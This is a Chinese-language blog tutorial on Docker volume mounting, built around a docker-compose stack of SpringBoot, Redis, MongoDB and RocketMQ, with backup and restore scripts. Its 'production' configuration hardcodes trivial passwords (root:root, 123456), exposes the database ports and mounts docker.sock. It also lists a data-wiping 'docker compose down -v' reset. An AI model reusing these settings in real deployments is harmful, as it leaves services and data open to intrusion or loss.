  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:50:18.000Z" title="Fri Nov 21 2025 03:50:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Docker 数据卷挂载核心概念</h2>
<h3 data-id="heading-1">1.1 数据卷的三种挂载方式</h3>





























<table><thead><tr><th>挂载方式</th><th>语法示例</th><th>特点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>匿名卷</strong>​</td><td><code>- /data</code></td><td>Docker自动命名，难管理</td><td>临时数据</td></tr><tr><td><strong>命名卷</strong>​</td><td><code>- db_data:/data</code></td><td>有明确名称，易管理</td><td>生产环境</td></tr><tr><td><strong>绑定挂载</strong>​</td><td><code>- ./data:/data</code></td><td>直接映射宿主机路径</td><td>开发环境</td></tr></tbody></table>
<h3 data-id="heading-2">1.2 数据卷生命周期管理</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 数据卷声明示例</span>
<span class="hljs-attr">volumes:</span>
  <span class="hljs-comment"># 1. 使用默认驱动</span>
  <span class="hljs-attr">mongo_data:</span>
  
  <span class="hljs-comment"># 2. 自定义配置</span>
  <span class="hljs-attr">redis_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">/path/on/host</span>
</code></pre>
<h2 data-id="heading-3">二、项目实战：SpringBoot + Redis + MongoDB + RocketMQ 完整配置</h2>
<h3 data-id="heading-4">2.1 项目结构</h3>
<pre><code class="hljs language-bash" lang="bash">/usr/rocket-demo/
├── docker-compose.yml
├── Dockerfile
├── broker.conf
├── mongo-init.js
├── data/           <span class="hljs-comment"># 绑定挂载目录</span>
│   ├── mongo/
│   ├── redis/
│   └── logs/
└── config/         <span class="hljs-comment"># 配置文件目录</span>
    └── redis.conf
</code></pre>
<h3 data-id="heading-5">2.2 完整的 docker-compose.yml 配置</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-comment"># SpringBoot 应用服务</span>
  <span class="hljs-attr">my-springboot-app:</span>
    <span class="hljs-attr">build:</span>
      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span>
      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">Dockerfile</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">my-springboot-app:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">my-springboot-app</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_PROFILES_ACTIVE=prod</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_DATA_MONGODB_URI=mongodb://root:root@mongo:27017/appdb?authSource=admin</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_REDIS_HOST=redis</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">ROCKETMQ_NAME_SERVER=rmqnamesrv:9876</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 绑定挂载：应用日志</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/logs:/app/logs</span>
      <span class="hljs-comment"># 绑定挂载：配置文件（开发环境热更新）</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/application-prod.yml:/app/config/application.yml:ro</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqnamesrv</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqbroker</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>

  <span class="hljs-comment"># Redis 服务 - 使用命名卷</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:7-alpine</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">redis</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"6379:6379"</span>
    <span class="hljs-attr">command:</span> 
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis-server</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/redis/redis.conf</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--requirepass</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"123456"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 命名卷：数据持久化</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>
      <span class="hljs-comment"># 绑定挂载：配置文件</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/redis.conf:/etc/redis/redis.conf:ro</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"redis-cli"</span>, <span class="hljs-string">"--raw"</span>, <span class="hljs-string">"incr"</span>, <span class="hljs-string">"ping"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">3s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>

  <span class="hljs-comment"># MongoDB 服务 - 混合挂载方式</span>
  <span class="hljs-attr">mongo:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mongo:5</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">mongo</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">MONGO_INITDB_DATABASE:</span> <span class="hljs-string">appdb</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"27017:27017"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 命名卷：数据库数据</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>
      <span class="hljs-comment"># 命名卷：配置数据</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_config:/data/configdb</span>
      <span class="hljs-comment"># 绑定挂载：初始化脚本</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./mongo-init.js:/docker-entrypoint-initdb.d/init.js:ro</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> <span class="hljs-string">echo</span> <span class="hljs-string">'db.runCommand("ping").ok'</span> <span class="hljs-string">|</span> <span class="hljs-string">mongosh</span> <span class="hljs-string">localhost:27017/test</span> <span class="hljs-string">--quiet</span>
      <span class="hljs-attr">interval:</span> <span class="hljs-string">30s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>

  <span class="hljs-comment"># RocketMQ NameServer</span>
  <span class="hljs-attr">rmqnamesrv:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">apache/rocketmq:5.1.0</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">rmqnamesrv</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9876:9876"</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">mqnamesrv</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 命名卷：日志存储</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmq_namesrv_logs:/home/rocketmq/logs</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmq_namesrv_store:/home/rocketmq/store</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>

  <span class="hljs-comment"># RocketMQ Broker</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">apache/rocketmq:5.1.0</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">rmqbroker</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"10911:10911"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"10909:10909"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">NAMESRV_ADDR:</span> <span class="hljs-string">"rmqnamesrv:9876"</span>
      <span class="hljs-attr">JAVA_OPTS:</span> <span class="hljs-string">" -Duser.home=/opt -Drocketmq.namesrv.addr=rmqnamesrv:9876 -Drocketmq.broker.ip=your_server_ip"</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">mqbroker</span> <span class="hljs-string">-c</span> <span class="hljs-string">/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 绑定挂载：Broker配置文件</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./broker.conf:/opt/rocketmq/conf/broker.conf:ro</span>
      <span class="hljs-comment"># 命名卷：消息存储</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmq_broker_store:/home/rocketmq/store</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmq_broker_logs:/home/rocketmq/logs</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqnamesrv</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>

<span class="hljs-comment"># 网络定义</span>
<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">app-network:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">bridge</span>
    <span class="hljs-attr">ipam:</span>
      <span class="hljs-attr">config:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">subnet:</span> <span class="hljs-number">172.20</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/16</span>

<span class="hljs-comment"># 数据卷定义</span>
<span class="hljs-attr">volumes:</span>
  <span class="hljs-comment"># MongoDB 数据卷</span>
  <span class="hljs-attr">mongo_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">none</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">bind</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">/usr/rocket-demo/data/mongo/data</span>
  <span class="hljs-attr">mongo_config:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>

  <span class="hljs-comment"># Redis 数据卷</span>
  <span class="hljs-attr">redis_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>

  <span class="hljs-comment"># RocketMQ 数据卷</span>
  <span class="hljs-attr">rmq_namesrv_logs:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmq_namesrv_store:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmq_broker_store:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmq_broker_logs:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
</code></pre>
<h2 data-id="heading-6">三、数据卷挂载实战详解</h2>
<h3 data-id="heading-7">3.1 绑定挂载 (Bind Mounts) 实战</h3>
<p><strong>适用场景</strong>：开发环境、配置文件、日志文件</p>
<pre><code class="hljs language-bash" lang="bash">volumes:
  <span class="hljs-comment"># 开发环境：源代码热部署</span>
  - ./src:/app/src
  
  <span class="hljs-comment"># 配置文件：支持热更新</span>
  - ./config/app.conf:/etc/app/app.conf:ro  <span class="hljs-comment"># 只读挂载</span>
  
  <span class="hljs-comment"># 日志文件：实时查看</span>
  - ./logs:/var/log/app
</code></pre>
<p><strong>权限控制</strong>：</p>
<ul>
<li><code>:ro</code>- 只读挂载（配置文件推荐）</li>
<li><code>:rw</code>- 读写挂载（默认，数据目录推荐）</li>
</ul>
<h3 data-id="heading-8">3.2 命名卷 (Named Volumes) 实战</h3>
<p><strong>适用场景</strong>：生产环境、数据库数据、需要Docker管理的数据</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">volumes:</span>
  <span class="hljs-comment"># 简单命名卷</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">db_data:/var/lib/mysql</span>
  
  <span class="hljs-comment"># 带配置的命名卷</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">database:</span>
      <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
      <span class="hljs-attr">driver_opts:</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">nfs</span>
        <span class="hljs-attr">o:</span> <span class="hljs-string">addr=192.168.1.100,rw</span>
        <span class="hljs-attr">device:</span> <span class="hljs-string">":/path/to/nfs"</span>
</code></pre>
<h3 data-id="heading-9">3.3 临时卷 (tmpfs) 实战</h3>
<p><strong>适用场景</strong>：敏感数据、临时缓存</p>
<pre><code class="hljs language-bash" lang="bash">tmpfs:
  - /tmp
  - /var/cache:size=100m,uid=1000
</code></pre>
<h2 data-id="heading-10">四、数据备份与恢复实战</h2>
<h3 data-id="heading-11">4.1 数据库备份脚本</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># backup.sh</span>

BACKUP_DIR=<span class="hljs-string">"./backup/<span class="hljs-subst">$(date +%Y%m%d_%H%M%S)</span>"</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$BACKUP_DIR</span>

<span class="hljs-comment"># 备份 MongoDB</span>
docker compose <span class="hljs-built_in">exec</span> mongo mongodump --uri=<span class="hljs-string">"mongodb://root:root@localhost:27017/appdb"</span> --out=/backup
docker <span class="hljs-built_in">cp</span> mongo:/backup <span class="hljs-variable">$BACKUP_DIR</span>/mongo

<span class="hljs-comment"># 备份 Redis</span>
docker compose <span class="hljs-built_in">exec</span> redis redis-cli --rdb /data/dump.rdb
docker <span class="hljs-built_in">cp</span> redis:/data/dump.rdb <span class="hljs-variable">$BACKUP_DIR</span>/redis/

<span class="hljs-comment"># 备份 RocketMQ 数据（如果需要）</span>
docker <span class="hljs-built_in">cp</span> rmqbroker:/home/rocketmq/store <span class="hljs-variable">$BACKUP_DIR</span>/rocketmq/

<span class="hljs-built_in">echo</span> <span class="hljs-string">"备份完成: <span class="hljs-variable">$BACKUP_DIR</span>"</span>
</code></pre>
<h3 data-id="heading-12">4.2 数据恢复脚本</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># restore.sh</span>

BACKUP_DIR=<span class="hljs-variable">$1</span>

<span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$BACKUP_DIR</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"用法: <span class="hljs-variable">$0</span> &lt;备份目录&gt;"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 恢复 MongoDB</span>
docker <span class="hljs-built_in">cp</span> <span class="hljs-variable">$BACKUP_DIR</span>/mongo mongo:/restore
docker compose <span class="hljs-built_in">exec</span> mongo mongorestore --uri=<span class="hljs-string">"mongodb://root:root@localhost:27017/appdb"</span> /restore

<span class="hljs-comment"># 恢复 Redis</span>
docker <span class="hljs-built_in">cp</span> <span class="hljs-variable">$BACKUP_DIR</span>/redis/dump.rdb redis:/data/
docker compose restart redis

<span class="hljs-built_in">echo</span> <span class="hljs-string">"数据恢复完成"</span>
</code></pre>
<h2 data-id="heading-13">五、生产环境最佳实践</h2>
<h3 data-id="heading-14">5.1 数据卷权限管理</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">services:</span>
  <span class="hljs-attr">app:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">myapp:latest</span>
    <span class="hljs-attr">user:</span> <span class="hljs-string">"1000:1000"</span>  <span class="hljs-comment"># 指定非root用户运行</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app_data:/data</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">PUID=1000</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">PGID=1000</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">app_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">o:</span> <span class="hljs-string">uid=1000,gid=1000</span>
</code></pre>
<h3 data-id="heading-15">5.2 多环境配置管理</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># docker-compose.prod.yml</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">mongo:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data_prod:/data/db</span>
      
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data_prod:/data</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">mongo_data_prod:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">/mnt/ssd/mongo_prod</span>
      
  <span class="hljs-attr">redis_data_prod:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">driver_opts:</span>
      <span class="hljs-attr">device:</span> <span class="hljs-string">/mnt/ssd/redis_prod</span>
</code></pre>
<h3 data-id="heading-16">5.3 监控与日志管理</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">services</span>:
  <span class="hljs-attr">mongo</span>:
    <span class="hljs-attr">volumes</span>:
      - <span class="hljs-attr">mongo_data</span>:<span class="hljs-regexp">/data/</span>db
      - <span class="hljs-regexp">/var/</span>log/<span class="hljs-attr">mongo</span>:<span class="hljs-regexp">/var/</span>log/mongodb  # 日志单独挂载
      
  <span class="hljs-attr">redis</span>:
    <span class="hljs-attr">volumes</span>:
      - <span class="hljs-attr">redis_data</span>:/data
      - ./redis.<span class="hljs-property">conf</span>:<span class="hljs-regexp">/etc/</span>redis/redis.<span class="hljs-property">conf</span>:ro

  # 日志收集器
  <span class="hljs-attr">logspout</span>:
    <span class="hljs-attr">image</span>: gliderlabs/logspout
    <span class="hljs-attr">volumes</span>:
      - <span class="hljs-regexp">/var/</span>run/docker.<span class="hljs-property">sock</span>:<span class="hljs-regexp">/var/</span>run/docker.<span class="hljs-property">sock</span>
    <span class="hljs-attr">volumes_from</span>:
      - mongo
      - redis
</code></pre>
<h2 data-id="heading-17">六、故障排查与维护命令</h2>
<h3 data-id="heading-18">6.1 数据卷管理命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有数据卷</span>
docker volume <span class="hljs-built_in">ls</span>

<span class="hljs-comment"># 查看数据卷详细信息</span>
docker volume inspect rocket-demo_mongo_data

<span class="hljs-comment"># 查看数据卷使用情况</span>
docker system <span class="hljs-built_in">df</span> -v

<span class="hljs-comment"># 备份数据卷</span>
docker run --<span class="hljs-built_in">rm</span> -v rocket-demo_mongo_data:/source -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar -czf /backup/mongo_backup.tar.gz -C /source ./

<span class="hljs-comment"># 清理未使用的数据卷</span>
docker volume prune
</code></pre>
<h3 data-id="heading-19">6.2 挂载点检查命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查容器挂载点</span>
docker inspect my-springboot-app | jq <span class="hljs-string">'.[0].Mounts'</span>

<span class="hljs-comment"># 检查文件权限</span>
docker compose <span class="hljs-built_in">exec</span> mongo <span class="hljs-built_in">ls</span> -la /data/db

<span class="hljs-comment"># 检查磁盘空间</span>
docker compose <span class="hljs-built_in">exec</span> mongo <span class="hljs-built_in">df</span> -h

<span class="hljs-comment"># 验证配置文件</span>
docker compose <span class="hljs-built_in">exec</span> redis <span class="hljs-built_in">cat</span> /etc/redis/redis.conf
</code></pre>
<h2 data-id="heading-20">七、项目部署完整流程</h2>
<h3 data-id="heading-21">7.1 初始化部署</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建目录结构</span>
<span class="hljs-built_in">mkdir</span> -p /usr/rocket-demo/{data,config,backup}
<span class="hljs-built_in">chmod</span> -R 755 /usr/rocket-demo

<span class="hljs-comment"># 2. 创建配置文件</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"brokerIP1=你的服务器IP"</span> &gt; broker.conf

<span class="hljs-comment"># 3. 启动服务</span>
<span class="hljs-built_in">cd</span> /usr/rocket-demo
docker compose up -d

<span class="hljs-comment"># 4. 检查服务状态</span>
docker compose ps
docker compose logs -f
</code></pre>
<h3 data-id="heading-22">7.2 日常维护命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看服务状态</span>
docker compose ps

<span class="hljs-comment"># 查看实时日志</span>
docker compose logs -f my-springboot-app

<span class="hljs-comment"># 备份数据</span>
./backup.sh

<span class="hljs-comment"># 更新服务（保留数据）</span>
docker compose down
docker compose pull
docker compose up -d

<span class="hljs-comment"># 完全重置（删除所有数据）</span>
docker compose down -v
docker compose up -d
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[B站消息新架构升级]]></title>    <link>https://juejin.cn/post/7574726841543295014</link>    <guid>https://juejin.cn/post/7574726841543295014</guid>    <pubDate>2025-11-21T03:55:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574726841543295014" data-draft-id="7574619023805513766" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="B站消息新架构升级"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2025-11-21T03:55:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哔哩哔哩技术"/> <meta itemprop="url" content="https://juejin.cn/user/3030701626893405"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            B站消息新架构升级
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030701626893405/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哔哩哔哩技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:55:23.000Z" title="Fri Nov 21 2025 03:55:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
